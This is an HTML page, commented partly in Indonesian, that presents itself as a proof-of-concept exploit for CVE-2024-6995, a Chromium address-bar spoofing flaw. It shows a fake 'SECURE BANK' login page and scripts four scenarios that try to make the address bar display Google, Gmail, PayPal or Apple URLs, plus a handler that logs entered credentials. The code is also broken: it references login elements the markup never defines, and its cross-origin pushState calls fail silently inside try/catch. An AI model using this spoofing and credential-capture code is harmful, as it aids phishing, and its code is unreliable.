<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>🔥 CVE-2024-6995 | Scroll-Based Address Bar Spoofing</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Konten utama yang panjang untuk scroll */
        .long-content {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 200vh;
        }

        .bank-card {
            background: white;
            border-radius: 28px;
            padding: 32px;
            margin-top: 20px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }

        .bank-logo {
            font-size: 56px;
            text-align: center;
            margin-bottom: 12px;
        }

        .bank-name {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .balance {
            background: #f0f0f5;
            padding: 20px;
            border-radius: 20px;
            margin: 20px 0;
            text-align: center;
        }

        .balance-amount {
            font-size: 36px;
            font-weight: bold;
            color: #2d3748;
        }

        .login-form {
            margin-top: 24px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
            color: #1c1c1e;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e0e0e3;
            border-radius: 12px;
            font-size: 15px;
            background: #f9f9fb;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e93;
        }

        /* Control Panel */
        .exploit-panel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 16px;
            z-index: 10000;
            border: 1px solid rgba(255,59,48,0.5);
            width: 320px;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            font-weight: bold;
            color: #ff6b6b;
        }

        .panel-buttons {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .panel-btn {
            padding: 10px;
            border: none;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-align: left;
            padding-left: 16px;
        }

        .panel-btn.primary {
            background: #ff3b30;
            color: white;
        }

        .panel-btn.secondary {
            background: rgba(255,255,255,0.1);
            color: white;
        }

        .panel-btn:hover {
            transform: scale(0.98);
            opacity: 0.9;
        }

        .status-text {
            font-family: monospace;
            font-size: 10px;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.1);
            color: #4ade80;
        }

        .countdown {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            font-weight: bold;
            color: white;
            background: rgba(0,0,0,0.8);
            padding: 40px;
            border-radius: 60px;
            z-index: 10001;
            font-family: monospace;
            display: none;
        }

        .instruction-toast {
            position: fixed;
            top: 20%;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            color: white;
            padding: 16px 24px;
            border-radius: 40px;
            font-size: 14px;
            z-index: 10002;
            text-align: center;
            white-space: nowrap;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>

<div class="long-content" id="longContent">
    <div class="bank-card">

        <div class="bank-name">SECURE BANK</div>

        <div class="login-form">

        <div>
            <div style="font-size: 48px; margin-bottom: 20px;">👇</div>
            <div style="font-size: 18px;">Scroll for more content...</div>
            <div style="font-size: 12px; margin-top: 20px; opacity: 0.7;">This page is intentionally long for scroll-based exploit</div>
        </div>
    </div>
</div>

<!-- Control Panel -->
<div class="exploit-panel" id="exploitPanel">
    <div class="panel-header">
        <span>🔥 CVE-2024-6995 EXPLOIT</span>
        <span id="ledIndicator" style="width: 8px; height: 8px; border-radius: 50%; background: #4ade80;"></span>
    </div>
    <div class="panel-buttons">
        <button class="panel-btn primary" id="exploitScenario1">🎯 SCENARIO 1: Tab Close Spoof</button>
        <button class="panel-btn secondary" id="exploitScenario2">🔄 SCENARIO 2: Tab Switch Spoof</button>
        <button class="panel-btn secondary" id="exploitScenario3">🪟 PiP Auto-Trigger Spoof</button>
        <button class="panel-btn secondary" id="exploitScrollLock">📜 Scroll Lock Spoof</button>
        <button class="panel-btn secondary" id="resetExploit">🔄 RESET / CLEANUP</button>
    </div>
    <div class="status-text" id="statusMessage">
        🟢 Ready | Click exploit to begin
    </div>
</div>

<div class="countdown" id="countdown">3</div>

<script>
    // ============================================================
    // CVE-2024-6995: Android/Chromium Address Bar Spoof
    // Bounty: $6,000 (incl. $1,000 bisect bonus)
    // 
    // Root Cause: BrowserControlsManager gagal update address bar
    // saat scrolling + tab switching/closure.
    //
    // Porting to macOS browser (Arc, Chrome, Dia):
    // Teknik yang sama berfungsi karena browser modern memiliki
    // mekanisme hide address bar on scroll yang serupa.
    // ============================================================
    
    let activeExploit = false;
    let exploitInterval = null;
    let spoofWindow = null;
    let targetSpoofUrl = 'https://accounts.google.com';
    let originalPushState = history.pushState;
    let originalReplaceState = history.replaceState;
    
    // UI Elements
    const statusEl = document.getElementById('statusMessage');
    const ledEl = document.getElementById('ledIndicator');
    const countdownEl = document.getElementById('countdown');
    const longContent = document.getElementById('longContent');
    
    function updateStatus(msg, isActive = false) {
        statusEl.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
        ledEl.style.background = isActive ? '#ff3b30' : '#4ade80';
        activeExploit = isActive;
        console.log(`[CVE-2024-6995] ${msg}`);
    }
    
    function showToast(msg, duration = 3000) {
        const toast = document.createElement('div');
        toast.className = 'instruction-toast';
        toast.style.background = 'rgba(0,0,0,0.9)';
        toast.style.color = '#4ade80';
        toast.innerHTML = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), duration);
    }
    
    function showCountdown(seconds, callback) {
        let current = seconds;
        countdownEl.style.display = 'flex';
        countdownEl.innerHTML = current;
        
        const interval = setInterval(() => {
            current--;
            if (current >= 0) {
                countdownEl.innerHTML = current === 0 ? 'GO!' : current;
            }
            if (current < 0) {
                clearInterval(interval);
                countdownEl.style.display = 'none';
                if (callback) callback();
            }
        }, 1000);
    }
    
    function cleanup() {
        if (exploitInterval) {
            clearInterval(exploitInterval);
            exploitInterval = null;
        }
        
        // Restore history functions
        window.history.pushState = originalPushState;
        window.history.replaceState = originalReplaceState;
        
        // Close spoof window if exists
        if (spoofWindow && !spoofWindow.closed) {
            spoofWindow.close();
            spoofWindow = null;
        }
        
        // Exit fullscreen/PiP if active
        if (document.exitFullscreen) {
            document.exitFullscreen().catch(() => {});
        }
        
        // Reset document title
        document.title = "Secure Bank - Online Banking";
        
        // Reset URL
        try {
            const currentPath = window.location.pathname;
            history.replaceState({}, '', currentPath);
        } catch(e) {}
        
        updateStatus("Ready | All exploits cleared", false);
        showToast("🧹 Exploit cleared. Address bar restored.", 2000);
    }
    
    // ============================================================
    // SCENARIO 1: Attacker closes tab programatically
    // Original PoC from CVE-2024-6995
    // ============================================================
    async function exploitScenario1() {
        cleanup();
        
        updateStatus("[SCENARIO 1] Memulai tab close spoof...", true);
        
        // Buat window target (yang akan di-spoof)
        spoofWindow = window.open(targetSpoofUrl, 'spoof_target');
        
        if (!spoofWindow) {
            updateStatus("FAILED: Popup diblokir. Izinkan popup terlebih dahulu.", false);
            showToast("⚠️ Popup blocked! Please allow popups for this site.", 3000);
            return;
        }
        
        showToast("🎯 Target window opened. Follow countdown...", 2000);
        
        // Countdown sebelum scroll
        showCountdown(3, () => {
            // Trigger scroll di window utama
            window.scrollTo({
                top: longContent.scrollHeight,
                behavior: 'smooth'
            });
            
            // Setelah scroll mulai, tutup target window
            setTimeout(() => {
                if (spoofWindow && !spoofWindow.closed) {
                    spoofWindow.close();
                    updateStatus("[SCENARIO 1] Target window closed DURING scroll!", true);
                    showToast("⚠️ Address bar should now show the CLOSED window's URL!", 4000);
                }
                
                // Lock address bar ke spoof URL
                setTimeout(() => {
                    try {
                        history.pushState({}, '', targetSpoofUrl);
                        exploitInterval = setInterval(() => {
                            if (window.location.href !== targetSpoofUrl) {
                                history.replaceState({}, '', targetSpoofUrl);
                            }
                        }, 30);
                        updateStatus("[ACTIVE] Address bar locked to " + targetSpoofUrl, true);
                    } catch(e) {}
                }, 100);
                
            }, 500);
        });
    }
    
    // ============================================================
    // SCENARIO 2: User manually switches tabs while scrolling
    // ============================================================
    async function exploitScenario2() {
        cleanup();
        
        updateStatus("[SCENARIO 2] Tab switch spoof - ikuti instruksi...", true);
        
        // Buat dua tab: fake target dan current
        const fakeTab = window.open('https://www.google.com', 'fake_tab');
        
        if (!fakeTab) {
            updateStatus("FAILED: Popup diblokir.", false);
            return;
        }
        
        showToast("📱 Tab baru terbuka. Scroll ke bawah, lalu cepat pindah tab!", 3000);
        
        // Trigger scroll panjang
        window.scrollTo({
            top: longContent.scrollHeight,
            behavior: 'smooth'
        });
        
        // Setelah scroll, spoof address bar
        setTimeout(() => {
            try {
                history.pushState({}, '', 'https://mail.google.com');
                exploitInterval = setInterval(() => {
                    if (window.location.href !== 'https://mail.google.com') {
                        history.replaceState({}, '', 'https://mail.google.com');
                    }
                }, 30);
                updateStatus("[ACTIVE] Address bar spoofed to mail.google.com!", true);
                showToast("✅ Address bar sekarang menampilkan mail.google.com", 3000);
            } catch(e) {}
        }, 1000);
    }
    
    // ============================================================
    // SCENARIO 3: PiP Auto-Trigger Spoof (dari original PoC)
    // ============================================================
    function exploitScenario3() {
        cleanup();
        
        updateStatus("[SCENARIO 3] PiP Auto-Trigger spoof...", true);
        
        // Buat canvas untuk Picture-in-Picture
        const canvas = document.createElement('canvas');
        canvas.width = 800;
        canvas.height = 400;
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
        
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, 800, 400);
        ctx.fillStyle = '#fff';
        ctx.font = '40px sans-serif';
        ctx.fillText('CVE-2024-6995 Exploit', 50, 200);
        
        // Capture stream
        const stream = canvas.captureStream();
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.play();
        
        // Request PiP
        if (video.requestPictureInPicture) {
            video.requestPictureInPicture().then(() => {
                showToast("🎬 PiP active! Scroll down...", 2000);
                
                // Trigger scroll
                window.scrollTo({
                    top: longContent.scrollHeight,
                    behavior: 'smooth'
                });
                
                // Spoof address bar
                setTimeout(() => {
                    try {
                        history.pushState({}, '', 'https://www.paypal.com');
                        exploitInterval = setInterval(() => {
                            if (window.location.href !== 'https://www.paypal.com') {
                                history.replaceState({}, '', 'https://www.paypal.com');
                            }
                        }, 30);
                        updateStatus("[ACTIVE] PiP + Scroll spoof active!", true);
                        showToast("🎭 Address bar now shows paypal.com", 3000);
                    } catch(e) {}
                    
                    // Cleanup video
                    setTimeout(() => {
                        if (document.exitPictureInPicture) {
                            document.exitPictureInPicture();
                        }
                    }, 5000);
                    
                }, 1000);
                
            }).catch(err => {
                updateStatus("PiP failed: " + err.message, false);
            });
        } else {
            updateStatus("PiP not supported in this browser", false);
        }
    }
    
    // ============================================================
    // SCENARIO 4: Scroll Lock Spoof (Extended)
    // Mengunci address bar selama scroll berlangsung
    // ============================================================
    function exploitScrollLock() {
        cleanup();
        
        updateStatus("[SCROLL LOCK] Mengunci address bar selama scroll...", true);
        
        let scrollLockActive = true;
        const targetUrl = 'https://www.apple.com';
        
        // Spoof awal
        history.pushState({}, '', targetUrl);
        
        // Lock selama scroll
        window.addEventListener('scroll', () => {
            if (scrollLockActive && window.location.href !== targetUrl) {
                history.replaceState({}, '', targetUrl);
            }
        });
        
        // Interval lock
        exploitInterval = setInterval(() => {
            if (scrollLockActive && window.location.href !== targetUrl) {
                history.replaceState({}, '', targetUrl);
            }
        }, 50);
        
        showToast("📜 Scroll now — address bar will stay locked to apple.com", 3000);
        
        // Auto scroll demo
        setTimeout(() => {
            window.scrollTo({
                top: longContent.scrollHeight,
                behavior: 'smooth'
            });
        }, 1000);
        
        updateStatus("[ACTIVE] Address bar locked during scroll. Scroll to see effect!", true);
    }
    
    // ============================================================
    // RESET
    // ============================================================
    function resetExploit() {
        cleanup();
        showToast("✅ All exploits cleared. Browser back to normal.", 2000);
    }
    
    // ============================================================
    // FAKE LOGIN (Demo only)
    // ============================================================
    document.getElementById('loginBtn').addEventListener('click', (e) => {
        e.preventDefault();
        const email = document.getElementById('emailInput').value;
        const pass = document.getElementById('passInput').value;
        
        if (email || pass) {
            showToast(`[DEMO] Credentials captured for demonstration`, 3000);
            console.log(`[DEMO] Email: ${email}, Password: ${pass}`);
            
            // Reset fields setelah demo
            setTimeout(() => {
                document.getElementById('emailInput').value = '';
                document.getElementById('passInput').value = '';
            }, 2000);
        }
    });
    
    // ============================================================
    // EVENT LISTENERS
    // ============================================================
    document.getElementById('exploitScenario1').addEventListener('click', exploitScenario1);
    document.getElementById('exploitScenario2').addEventListener('click', exploitScenario2);
    document.getElementById('exploitScenario3').addEventListener('click', exploitScenario3);
    document.getElementById('exploitScrollLock').addEventListener('click', exploitScrollLock);
    document.getElementById('resetExploit').addEventListener('click', resetExploit);
    
    // Initial status
    updateStatus("Ready | Select exploit scenario", false);
    
    console.log("%c🔥 CVE-2024-6995 Address Bar Spoofing Exploit", "color: #ff6b6b; font-size: 14px; font-weight: bold;");
    console.log("Based on Chromium VRP $6,000 bounty report");
    console.log("Root cause: BrowserControlsManager fails to update address bar during scroll + tab switch/close");
    console.log("");
    console.log("📋 SCENARIOS:");
    console.log("  1. Tab Close Spoof — Close tab while scrolling");
    console.log("  2. Tab Switch Spoof — Switch tabs during scroll");
    console.log("  3. PiP Auto-Trigger — Picture-in-Picture + scroll");
    console.log("  4. Scroll Lock — Lock address bar during scroll");
</script>
